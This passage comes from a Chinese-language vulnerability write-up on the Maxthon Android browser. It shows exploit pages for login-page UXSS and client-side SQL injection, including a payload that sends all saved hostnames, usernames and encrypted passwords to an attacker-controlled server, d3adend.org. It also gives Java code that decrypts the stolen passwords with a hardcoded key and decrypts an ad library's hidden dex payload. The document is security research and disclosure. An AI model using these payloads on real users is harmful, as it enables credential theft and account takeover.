<p>此时如果受害者使用傲游浏览器访问恶意页面，那么他们的本地 SQLite 数据库将被我们制作的数据库覆盖，当当受害者访问 Yahoo ，Twitter 或者 Google 登录页面时，我们的 JavaScript 代码将执行。</p>
<p><img class="alignnone size-full wp-image-91923 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-1.png" alt="maxfilewrtloginuxss4325-1" width="495" height="879" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-1.png 495w, http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-1-169x300.png 169w" sizes="(max-width: 495px) 100vw, 495px" /></p>
<p>—— 受害者访问恶意网页，并自动安装”webapp“。此时受害者的本地数据库已被覆盖。</p>
<p><img class="alignnone size-full wp-image-91924 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-2.png" alt="maxfilewrtloginuxss4325-2" width="502" height="887" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-2.png 502w, http://www.mottoin.com/wp-content/uploads/2016/11/maxFileWrtLoginUXSS4325-2-170x300.png 170w" sizes="(max-width: 502px) 100vw, 502px" /></p>
<p>—— 我们的 JavaScript 代码在 Google 的登录页面再一次执行。</p>
<h2>寻找客户端 SQL 注入漏洞</h2>
<p>目前为止我们已经使用 catchform 方法来利用 UXSS 漏洞，但是利用暴露的 catchform 方法在 mxbrowser_default 数据库中触发客户端 SQL 注入也是可行的，这可以远程破坏数据库的完整性和机密性。</p>
<p>考虑到下面的代码取自 com.mx.browser.a.f 类。当域的用户名/密码行不存在时，使用参数化的 SQL 语句将数据插入本地数据库。当该域的用户名/密码行已经存在时，使用动态字符串链接构建 UPDATE SQL 语句。恶意网页控制 b 变量（用户名）和 a 变量（host），但不直接控制 c 变量（密码），因为密码是被加密编码过的。</p>
<pre>Cursor v1;
 SQLiteDatabase v0 = g.a().d();
 String v2 = "select * from mxautofill where host =?";
 h.f();
 try {
 v1 = v0.rawQuery(v2, new String[]{this.a});
 if(v1.getCount() &lt;= 0) {
 ContentValues v2_1 = new ContentValues();
 v2_1.put("host", this.a);
 v2_1.put("username", this.b);
 v2_1.put("password", this.c);
 v0.insert("mxautofill", null, v2_1);
 }
 else {
 v1.moveToFirst();
 v1.getColumnIndexOrThrow("host");
 v2 = "update mxautofill set username = \'" + this.b + "\',passwrd = \'" + this.c + "\' where host = \'" + this.a + "\'";
 h.f();
 v0.execSQL(v2);
 }
 }</pre>
<h2>通过 SQL 注入篡改数据库，在所有保存过的域下触发登录页面 UXSS</h2>
<p>考虑到我们能够注入的 SQL 语句是一个 UPDATE 语句，作用是更改一个域下的填充信息，可以想到最简单的利用方法便是操纵 UPDATE 语句篡改所有保存的自动填充信息，配合设计好的数据来利用登录页面 UXSS 漏洞。这个漏洞可以让我们在每个受害者常用的登录页面注入 JavaScript（假设受害者使用自动填充功能）。</p>
<p>我构建了以下 HTML 页面，通过调用 catchform 方法来利用 SQL 漏洞。注意我们利用漏洞必须尝试使用浏览器之前存储的信息来自动填充信息，因为 SQL 注入与 UPDATE 语句相关联，而不是最初的 INSERT 语句。因此攻击者可能选择流行的 URL 作为 documentURI 的值。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"loginsqltest@gmail.com\'\'-alert(\'\'SqlTest:\'\'+document.domain)-\'\'\'--"},{"id":"password","name":"password","value":"fakepassword"}]}'; 
mxautofill.catchform(json); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
<p>当用户访问恶意页面时，会提示用户“save your account？”，并且用户必须在 SQL 注入漏洞被利用之前点击 “Yes”。</p>
<p><img class="alignnone size-full wp-image-91925 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt1-5839.png" alt="mxsqlcorrupt1-5839" width="720" height="1280" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt1-5839.png 720w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt1-5839-169x300.png 169w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt1-5839-576x1024.png 576w" sizes="(max-width: 720px) 100vw, 720px" /></p>
<p>—— 一些用户交互</p>
<p>然后浏览器执行以下 SQL 语句。请注意，我们在用户名字段注入我们的 JavaScript，然后使用 SQL 注入注释掉其它的 SQL 语句，包括 WHERE 子语句，以便将更新限制为只有一行。</p>
<pre>update mxautofill set username = 'loginsqltest@gmail.com''-alert(''SqlTest:''+document.domain)-'''-- 
',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'</pre>
<p>检测设备上的 SQLite 数据库我们看到我们已经成功更新了 mxautofill 表中的所有行。</p>
<p><img class="alignnone size-full wp-image-91926 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt3-5839.png" alt="mxsqlcorrupt3-5839" width="1538" height="464" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt3-5839.png 1538w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt3-5839-300x91.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt3-5839-768x232.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt3-5839-1024x309.png 1024w" sizes="(max-width: 1538px) 100vw, 1538px" /></p>
<p>—— 本地 SQLite 数据库已被篡改</p>
<p>下一次，当受害者访问存储自动填充信息的域名之一的登录页面时，我们的 JavaScript 代码通过 WebView 的 loadUrl 方法执行。</p>
<p><img class="alignnone size-full wp-image-91928 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt2-5839.png" alt="mxsqlcorrupt2-5839" width="720" height="1280" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt2-5839.png 720w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt2-5839-169x300.png 169w, http://www.mottoin.com/wp-content/uploads/2016/11/mxSqlCorrupt2-5839-576x1024.png 576w" sizes="(max-width: 720px) 100vw, 720px" /></p>
<p>—— 当受害者浏览 Twitter 或者 Google 的登录页面时 ，JS payload 得以触发</p>
<h2>使用 SQL 注入和登录页面 UXSS 提取敏感数据</h2>
<p>如果我们要从mxautofill表远程提取所有的用户名和加密密码怎么办？我构造了以下 HTML 页面利用 SQL 漏洞实现了目标。基本上，我们将使用内部查询构建一个 JavaScript 字符串，其中包括存储在表中的所有主机，用户名和加密过的密码。然后我们使用登录页面 UXSS 漏洞和 AJAX 从设备窃取信息。</p>
<pre>&lt;html&gt; 
&lt;body&gt; 
&lt;script&gt; 
var json = '{"documentURI":"https://accounts.google.com/","inputs":[{"id":"username","name":"username","value":"\'\');var request=new XMLHttpRequest();dataToSteal=\'\'\'||(SELECT GROUP_CONCAT(host||\':\'||username||\':\'||password) from mxautofill)||\'\'\';request.open(\'\'GET\'\',\'\'http://d3adend.org/c.php?c=\'\'+dataToSteal,false);request.send();//\'--"},{"id":"password","name":"password","value":"fakepassword"}]}'; 
mxautofill.catchform(json); 
&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;</pre>
<p>当用户访问恶意页面时，会提示用户“sava your account？”，而且 利用SQL 注入漏洞之前用户必须点击“Yes”。</p>
<p><img class="alignnone size-full wp-image-91929 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-0.png" alt="maxsqlinjectexfil5403-0" width="427" height="756" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-0.png 427w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-0-169x300.png 169w" sizes="(max-width: 427px) 100vw, 427px" /></p>
<p>—— 点击“Yes”</p>
<p>浏览器接下来会执行以下 SQL 语句。</p>
<pre>update mxautofill set username = ''');var request=new XMLHttpRequest();dataToSteal='''||(SELECT 
GROUP_CONCAT(host||':'||username||':'||password) from 
mxautofill)||''';request.open(''GET'',''http://d3adend.org/c.php?c=''+dataToSteal,false);request.send();//'--
',password = '3tJIh6TbL87pyKZJOCaZag%3D%3D' where host = 'accounts.google.com'</pre>
<p>mxautofill 表中的所有行都已经在客户端数据库中更新。</p>
<p><img class="alignnone size-full wp-image-91931 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-1.png" alt="maxsqlinjectexfil5403-1" width="1500" height="277" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-1.png 1500w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-1-300x55.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-1-768x142.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-1-1024x189.png 1024w" sizes="(max-width: 1500px) 100vw, 1500px" /></p>
<p>—— 所有记录都均被修改</p>
<p>当受害者访问有自动填充信息的域登录页面时，我们的 JavaScript 代码得以执行。在实际使用过程中， dataToSteal 变量将包含真实的账户凭据。</p>
<pre>javascript:mx_form_fill('');var request=new XMLHttpRequest(); 
dataToSteal='acccount_1_hostname:account_1_username:account_1_encrypted_password, 
acccount_2_hostname:account_2_username:account_2_encrypted_password,etc.'; 
request.open('GET','http://d3adend.org/c.php?c='+dataToSteal,false);request.send();//'','fakepassword')</pre>
<p><img class="alignnone size-full wp-image-91932 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-2.png" alt="maxsqlinjectexfil5403-2" width="391" height="693" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-2.png 391w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-2-169x300.png 169w" sizes="(max-width: 391px) 100vw, 391px" /></p>
<p>—— 不可见的漏洞利用得以执行</p>
<p><img class="alignnone size-full wp-image-91933 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-3.png" alt="maxsqlinjectexfil5403-3" width="1500" height="477" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-3.png 1500w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-3-300x95.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-3-768x244.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-3-1024x326.png 1024w" sizes="(max-width: 1500px) 100vw, 1500px" /></p>
<p>—— 域名，用户名和加密的密码通过 AJAX 发送到攻击者控制的服务器。</p>
<p>因此，我们现在有了来自受害者的 mxautofill 表的主机名，用户名和加密密码，但我们需要解密密钥。为了获取加密密钥，我仅使用了一个自定义的 Xposed 模块在两个不同的设备上来 hook 一个与自动填充功能相关的加密方法调用。在两个设备上， Maxthon 使用了相同的硬编码密钥（“eu3o4[r04cml4eir”）进行密码存储。</p>
<p>几个月后，我抱着一丝希望搜索了 “eu3o4[r04cml4eir”，却发现了 Exatel 的一些有趣的关于 windows 版本的 Maxthon 的<a href="https://exatel.pl/advisory/maxthonreporten.pdf">隐私安全研究</a>。他们的结论是“整个用户的网站浏览历史会到达位于北京的 Maxthon 作者的服务器，还包括所有输入的 Google 搜索记录”。浏览器的桌面版本使用相同的加密密钥加密用户的浏览历史，正如我在 Android 版本所发现的那样。开发者团队在面对用户时并<a href="http://forum.maxthon.com/index.php?/topic/18513-maxthon-permission-violation/">不承认任何错误</a>， CEO 随后发表<a href="http://news.softpedia.com/news/maxthon-browser-collects-sensitive-data-even-if-users-opt-out-506327.shtml">声明</a>。</p>
<p>“Exatel 还报告说，Maxthon 将 URL 发送回其服务器。正如所有 URL 的安全检查工作，Maxthon 的云安全扫描模块（cloud secure）检测用户所访问的网站的安全性。通过执行 URL 安全检测，Maxthon 向其服务器发送 URL 以检测网站是否安全。由于这些安全检查的存在，自2005年以来我们已经阻止了用户访问数百万的虚假网站和恶意网站。在我们的最新版本中，我们将添加一个选项，可供用户关闭扫描模块。”</p>
<blockquote><p>(原文)</p>
<p>“Exatel also reported that Maxthon sends URLs back to its server. Just as all URL security checks work, Maxthon’s cloud security scanner module (cloud secure) checks the safety of the websites our users visit. By implementing this URL security check, Maxthon sends URLs to its server to check if the website is safe or not. As a result of these security checks, we have prevented our users from visiting millions of fake and malicious websites since 2005. In our latest version, we will add an option for users to turn off the scanner.”</p></blockquote>
<p>我不确定我相信这个功能实际上实际上是一个“云安全扫描器”，像 CEO 声称，但不管其意图，通过 HTTP 使用硬编码密钥发送加密的浏览器历史纪录可不是个好主意。在 Android 的版本的浏览器中，我还发现了类似的功能在 com.mx.browser.statistics.z 类中。这里需要注意，以下代码将加密的“统计”数据发送到同一个 URL ，并且像 Exatel 的研究中显示的那样使用相同的加密密钥。</p>
<pre>final class z extends AsyncTask { 
 z(PlayCampaignReceiver arg1, String arg2) {
 this.b = arg1;
 this.a = arg2;
 super();
 }

private Void a() {
 JSONObject v0 = new JSONObject();
 try {
 v0.put("l", ch.r);
 v0.put("sv", ch.e);
 v0.put("cv", ch.l);
 v0.put("pn", ch.g);
 v0.put("d", ch.e());
 v0.put("pt", "gp_install");
 v0.put("m", "main");
 JSONObject v1 = new JSONObject();
 v1.put("imei", ch.m);
 v1.put("refer", this.a);
 v1.put("aid", ch.n);
 v1.put("model", ch.p);
 v1.put("mac", ch.u);
 v0.put("data", v1);
 new StringBuilder("before = ").append(v0).toString();
 String v0_3 = Uri.encode(new String(Base64.encode(a.a(v0.toString(), "eu3o4[r04cml4eir"), 2), "UTF-8"));
 new StringBuilder("after urlencode =").append(v0_3).toString();
 y v1_1 = new y();
 v0_3 = "http://g.dcs.maxthon.com/mx4/enc?keyid=default&amp;data=" + v0_3;
 new StringBuilder("url=").append(v0_3).append(";response = ").append(v1_1.a(v0_3, 3).getStatusLine().getStatusCode()).toString();
 }</pre>
<p>反正已经跑题了。那就干脆把通过客户端 SQL 注入和登陆页面 UXSS 漏洞获取的密码给破解了吧。在写出加密算法，加密模式和密钥之后，我写了以下简单的 Java 程序。</p>
<pre>import java.util.Base64; 
import javax.crypto.Cipher; 
import javax.crypto.spec.SecretKeySpec;

public class MaxDecrypt { 
 public static void main(String[] args) throws Exception {
 String rawUserDataArg = args[0];
 System.out.println("");
 if(rawUserDataArg != null) {
 String[] rawUserDataArray = rawUserDataArg.split(",");
 for(String rawUserData : rawUserDataArray) {
 String host = rawUserData.split(":")[0];
 String username = rawUserData.split(":")[1];
 String encryptedPassword = rawUserData.split(":")[2];
 String decryptedPassword = decrypt(encryptedPassword);

System.out.println("====================================");
 System.out.println("Host: " + host);
 System.out.println("Username: " + username);
 System.out.println("Password: " + decryptedPassword);
 }
 System.out.println("====================================");
 }
 }

public static String decrypt(String ciphertext) throws Exception {
 SecretKeySpec sks = new SecretKeySpec("eu3o4[r04cml4eir".getBytes("UTF-8"), "AES");
 Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
 Base64.Decoder decoder = Base64.getDecoder();
 byte[] ciphertextBytes = decoder.decode(ciphertext);
 cipher.init(Cipher.DECRYPT_MODE, sks);
 byte[] plaintextBytes = cipher.doFinal(ciphertextBytes);
 return new String(plaintextBytes);
 }
}</pre>
<p><img class="alignnone size-full wp-image-91935 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-4.png" alt="maxsqlinjectexfil5403-4" width="1275" height="252" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-4.png 1275w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-4-300x59.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-4-768x152.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/maxSqlInjectExfil5403-4-1024x202.png 1024w" sizes="(max-width: 1275px) 100vw, 1275px" /></p>
<p>—— 解密获取到的凭据</p>
<h2>任意文件写入漏洞 &#8211; 越过远程执行代码的障碍</h2>
<p>一般来说，在 Android 操作系统中，非特权应用的任意文件写入漏洞很难变成远程代码执行。</p>
<ol>
<li>应用程序主要 dex 代码，或 OAT 进程的输出由系统用户所有，因此在正常情况下不应该覆盖此代码。</li>
<li>应用程序的存储 ELF 共享对象的 lib 目录，实际上是一个链接到所有者为系统用户目录，所以正常情况下不太可能覆盖这些代码。</li>
</ol>
<p>话虽如此，在很多情况下，任意文件写入漏洞可以很容易地变成远程代码执行漏洞。</p>
<ol>
<li>目标应用程序通过 <a href="https://developer.android.com/reference/dalvik/system/DexClassLoader.html">DexClassLoader </a>类执行动态类加载，并且可以覆盖存储的dex代码。</li>
<li>目标应用程序不正确存储其ELF共享对象文件，使得这些文件不属于系统用户。<br />
<a href="https://www.nowsecure.com/blog/2015/08/10/world-writable-code-is-bad-mmmmkay-4/">Jake Van Dyke</a> 和 <a href="http://rotlogix.com/2015/10/11/mercury-browser-for-android-rce-redux/">rotlogix</a> 都提到了 SO 全局可写的应用范例，这允许根据情况进行本地或远程利用。</li>
<li>目标应用程序以 <a href="https://www.nowsecure.com/blog/2015/06/16/remote-code-execution-as-system-user-on-samsung-phones/">系统用户权限运行</a>。</li>
<li>目标应用程序是 <a href="https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/">multidex 应用</a>，且不在使用 ART 运行环境的设备上运行。</li>
</ol>
<p>我最初确定这些漏洞时我不相信这些条件有那条成立，但几个月后，当一个较新版本的发布时，我注意到一些新的软件包被添加到代码库，包括 com.igexin.。这显然是一个被赛门铁克标记为<a href="https://www.symantec.com/security_response/writeup.jsp?docid=2015-032606-5519-99&amp;tabid=2">不需要的应用程序的广告库</a>，其绑定了一些会收集用户信息的 Android 应用，而且应用会把这些信息发送到服务器。事实证明，这个广告使用了 DexClassLoader 类执行加密代码的动态库加载，所以我们可以利用这个功能，通过任意文件写入漏洞来实现远程代码执行。</p>
<p>在新版本的浏览器中，我注意到 /data/data/com.mx.browser/files 目录中看起来很奇怪的新文件，如 tdata_qiz011，tdata_qiz011.dex，tdata_rqS304和 tdata_rqS304.dex。 注意虽然文件名看起来貌似随机生成，在多个设备上安装应用程序后，我注意到文件名不是根据设备特定生成的。</p>
<p><img class="alignnone size-full wp-image-91936 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile0.png" alt="dexfile0" width="830" height="706" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile0.png 830w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile0-300x255.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile0-768x653.png 768w" sizes="(max-width: 830px) 100vw, 830px" /></p>
<p>—— 包含优化 dex 文件的可疑文件</p>
<p><img class="alignnone size-full wp-image-91937 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile1.png" alt="dexfile1" width="1016" height="176" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile1.png 1016w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile1-300x52.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile1-768x133.png 768w" sizes="(max-width: 1016px) 100vw, 1016px" /></p>
<p>—— 未知的文件格式和优化的 dex 文件</p>
<p>我决定调查 tdata_rqS304 里面有什么东西。我怀疑这是一个加密的 JAR/APK 文件，但我不确定。</p>
<p><img class="alignnone size-full wp-image-91938 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile2.png" alt="dexfile2" width="1206" height="1094" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile2.png 1206w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile2-300x272.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile2-768x697.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile2-1024x929.png 1024w" sizes="(max-width: 1206px) 100vw, 1206px" /></p>
<p>—— 加密过的 APK/JAR ？</p>
<p>执行动态类加载的代码位于 com.igexin.push.extension.a 类中。代码似乎加载了一个文件，比如 tdata_rqS04 ，解密到一个 JAR 文件，如 tdata_reS304.jar ，从 JAR 文件中加载一个类，创建一个类的实例（调用构造函数），然后删除原 JAR 文件（使其逆向工程中隐藏）。我猜测 com.igexin.a.a.a.a.a 是解密方法。</p>
<pre>public boolean a(Context arg10, String arg11, String arg12, String arg13, String arg14) {
 Class v0_1;
 File v2 = new File(arg11);
 File v3 = new File(arg11 + ".jar");
 File v4 = new File(arg10.getFilesDir().getAbsolutePath() + "/" + arg14 + ".dex");
 this.a(v2, v3, arg13);

if(v3.exists()) {
 try {
 DexClassLoader v2_1 = new DexClassLoader(v3.getAbsolutePath(), arg10.getFilesDir().getAbsolutePath(), null, arg10.getClassLoader());
 try {
 v0_1 = v2_1.loadClass(arg12);
 }
 catch(Exception v2_2) {
 }
 }
 catch(Throwable v0) {
 goto label_74;
 }

try {
 v3.delete();
 v4.exists();
 if(v0_1 == null) {
 boolean v0_2 = false;
 return v0_2;
 }

Object v0_3 = v0_1.newInstance();
...
 public void a(File arg10, File arg11, String arg12) {
 BufferedOutputStream v1_5;
 Throwable v8;
 int v1_1;
 FileInputStream v2;
 BufferedOutputStream v0_2;
 FileOutputStream v2_1;
 FileInputStream v3;
 FileOutputStream v1 = null;
 try {
 v3 = new FileInputStream(arg10);
 }
 catch(Throwable v0) {
 v2_1 = v1;
 v3 = ((FileInputStream)v1);
 goto label_45;
 }
 catch(Exception v0_1) {
 v0_2 = ((BufferedOutputStream)v1);
 v2 = ((FileInputStream)v1);
 goto label_22;
 }

try {
 v2_1 = new FileOutputStream(arg11);
 }
 catch(Throwable v0) {
 v2_1 = v1;
 goto label_45;
 }
 catch(Exception v0_1) {
 v0_2 = ((BufferedOutputStream)v1);
 v2 = v3;
 goto label_22;
 }

try {
 v0_2 = new BufferedOutputStream(((OutputStream)v2_1));
 v1_1 = 1024;
 }
 catch(Throwable v0) {
 goto label_45;
 }
 catch(Exception v0_1) {
 v0_2 = ((BufferedOutputStream)v1_1);
 v1 = v2_1;
 v2 = v3;
 goto label_22;
 }

try {
 byte[] v1_4 = new byte[v1_1];
 while(true) {
 int v4 = v3.read(v1_4);
 if(v4 == -1) {
 break;
 }

byte[] v5 = new byte[v4];
 System.arraycopy(v1_4, 0, v5, 0, v4);
 v0_2.write(com.igexin.a.a.a.a.a(v5, arg12));
 }</pre>
<p>com.igenxin.a.a.a.a 类使用本地加密算法执行解密。输入验证至关重要（&#8221;key is fail!&#8221;）。</p>
<pre>package com.igexin.a.a.a;

public class a { 
 public static void a(int[] arg2, int arg3, int arg4) {
 int v0 = arg2[arg3];
 arg2[arg3] = arg2[arg4];
 arg2[arg4] = v0;
 }

public static boolean a(byte[] arg6) {
 boolean v0_1;
 int v3 = arg6.length;
 if(v3 256) {
 v0_1 = false;
 }
 else {
 int v2 = 0;
 int v0 = 0;
 while(v2 3) {
 v0_1 = false;
 return v0_1;
 }
 }

++v2;
 }

v0_1 = true;
 }

return v0_1;
 }

public static byte[] a(byte[] arg1, String arg2) {
 return a.a(arg1, arg2.getBytes());
 }

public static byte[] a(byte[] arg7, byte[] arg8) {
 int v1 = 0;
 if(!a.a(arg8)) {
 throw new IllegalArgumentException("key is fail!");
 }

if(arg7.length &lt;= 0) {
 throw new IllegalArgumentException("data is fail!");
 }

int[] v3 = new int[256];
 int v0;
 for(v0 = 0; v0 &lt; v3.length; ++v0) {
 v3[v0] = v0;
 }

v0 = 0;
 int v2 = 0;
 while(v0 &lt; v3.length) {
 v2 = (v2 + v3[v0] + (arg8[v0 % arg8.length] &amp; 255)) % 256;
 a.a(v3, v0, v2);
 ++v0;
 }

byte[] v4 = new byte[arg7.length];
 v0 = 0;
 v2 = 0;
 while(v1 &lt; v4.length) {
 v0 = (v0 + 1) % 256;
 v2 = (v2 + v3[v0]) % 256;
 a.a(v3, v0, v2);
 v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ arg7[v1]));
 ++v1;
 }

return v4;
 }

public static byte[] b(byte[] arg1, String arg2) {
 return a.a(arg1, arg2.getBytes());
 }
}</pre>
<p>所以现在我们知道如何揭秘 JAR 文件了，但是我们需要知道加密密钥。我又通过 Xposed 使用了模块动态分析来却id那个每个文件使用了哪个加密密钥以及加载了哪个类。以下是我从 tdata_rqS304 文件中获取到的信息。我还在不同设备验证了加密密钥不是针对特定设备的。例如，加密库使用“5f8286ee3424bed2b71f66d996b247b8”作为密钥来解密 tdata_rqS304 文件。</p>
<pre>Method Caller: com.igexin.push.extension.a@420bfd48 
Argument Types: com.igexin.sdk.PushService, java.lang.String, java.lang.String, java.lang.String, java.lang.String 
Argument 0: com.igexin.sdk.PushService@420435b8 
Argument 1: /data/data/com.mx.browser/files/tdata_rqS304 
Argument 2: com.igexin.push.extension.distribution.basic.stub.PushExtension 
Argument 3: 5f8286ee3424bed2b71f66d996b247b8 
Argument 4: tdata_rqS304</pre>
<p>现在我们用于了解密文件并检查 JAR 文件的所有信息。以下 Java 程序将揭秘 tdata_rqS304 文件。</p>
<pre>import java.util.Base64; 
import javax.crypto.Cipher; 
import javax.crypto.spec.SecretKeySpec; 
import java.io.*;

public class MaxDexDecrypt { 
 public static void main(String[] args) throws Exception {
 String ciphertextFilename = "tdata_rqS304";
 String plaintextFilename = "tdata_rqS304.jar";
 String keyString = "5f8286ee3424bed2b71f66d996b247b8";

File ciphertextFile = new File(ciphertextFilename);
 File plaintextFile = new File(plaintextFilename);
 decryptFile(ciphertextFile, plaintextFile, keyString);
 }

public static void decryptFile(File ciphertextFile, File plaintextFile, String keyString) {
 BufferedOutputStream v1_5;
 Throwable v8;
 int v1_1;
 FileInputStream v2;
 BufferedOutputStream v0_2;
 FileOutputStream v2_1;
 FileInputStream v3;
 FileOutputStream v1 = null;
 try {
 v3 = new FileInputStream(ciphertextFile);
 v2_1 = new FileOutputStream(plaintextFile);
 v0_2 = new BufferedOutputStream(((OutputStream)v2_1));
 v1_1 = 1024;
 byte[] v1_4 = new byte[v1_1];
 while(true) {
 int v4 = v3.read(v1_4);
 if(v4 == -1) {
 break;
 }
 byte[] v5 = new byte[v4];
 System.arraycopy(v1_4, 0, v5, 0, v4);
 v0_2.write(decrypt(v5, keyString));
 }
 v3.close();
 v0_2.flush();
 v0_2.close();
 v2_1.close();
 v3.close();
 v0_2.close();
 v2_1.close();
 }
 catch(Exception v0_1) {
 }
 }

public static void junk(int[] arg2, int arg3, int arg4) {
 int v0 = arg2[arg3];
 arg2[arg3] = arg2[arg4];
 arg2[arg4] = v0;
 }

public static byte[] decrypt(byte[] ciphertextBytes, String keyString) {
 return decrypt(ciphertextBytes, keyString.getBytes());
 }

public static byte[] decrypt(byte[] ciphertextBytes, byte[] keyBytes) {
 int v1 = 0;
 int[] v3 = new int[256];
 int v0;
 for(v0 = 0; v0 &lt; v3.length; ++v0) {
 v3[v0] = v0;
 }

v0 = 0;
 int v2 = 0;
 while(v0 &lt; v3.length) {
 v2 = (v2 + v3[v0] + (keyBytes[v0 % keyBytes.length] &amp; 255)) % 256;
 junk(v3, v0, v2);
 ++v0;
 }

byte[] v4 = new byte[ciphertextBytes.length];
 v0 = 0;
 v2 = 0;
 while(v1 &lt; v4.length) {
 v0 = (v0 + 1) % 256;
 v2 = (v2 + v3[v0]) % 256;
 junk(v3, v0, v2);
 v4[v1] = ((byte)(v3[(v3[v0] + v3[v2]) % 256] ^ ciphertextBytes[v1]));
 ++v1;
 }
 return v4;
 }
}</pre>
<p>解密有效！</p>
<p><img class="alignnone size-full wp-image-91939 j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3.png" alt="dexfile3" width="1234" height="844" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3.png 1234w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3-300x205.png 300w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3-768x525.png 768w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3-1024x700.png 1024w, http://www.mottoin.com/wp-content/uploads/2016/11/dexFile3-220x150.png 220w" sizes="(max-width: 1234px) 100vw, 1234px" /></p>
<p>—— 解密成功，只是个有一些 dex 代码的 JAR 文件</p>
